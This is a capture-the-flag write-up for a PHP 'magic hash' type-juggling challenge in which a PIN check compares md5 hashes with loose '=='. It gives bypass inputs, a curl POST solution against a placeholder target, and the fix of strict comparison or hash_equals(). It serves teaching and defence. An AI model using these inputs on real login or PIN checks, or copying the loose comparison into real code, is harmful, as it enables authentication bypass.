# PHP Type Juggling — VaultPin

A PIN-unlock page where the server compares `md5($pin)` to a
stored hash using PHP's loose `==`. The stored hash happens to be
`0e462097431906509019562988736854` — a "magic hash" of the form
`0e[digits]`. PHP coerces both sides to floats; both collapse to
`0.0`; the check passes for any input whose md5 fits the same
shape.

## Player target

Submit a PIN whose `md5()` is a `0e[only-digits]` string.

## Author solution

Any of the well-known magic-md5 inputs work; e.g.

```
pin=QNKCDZO       md5 -> 0e830400451993494058024219903391
pin=aabg7XSs      md5 -> 0e087386482136013740957780965295
pin=240610708     md5 -> 0e462097431906509019562988736854  (same as stored)
```

```
curl -s -X POST -d 'pin=QNKCDZO' http://target/
```

## Why this is the lesson

`==` in PHP is type-juggling shorthand. Comparing
hashes/keys/tokens/PINs must use `===` (strict, no coercion) or
`hash_equals()` (constant-time, no coercion). Real-world incidents
include WordPress plugin auth bypasses and CTF-favourite SSO
fixtures. Same principle applies to JavaScript `==` and to
language-agnostic JSON-comparison sinks.
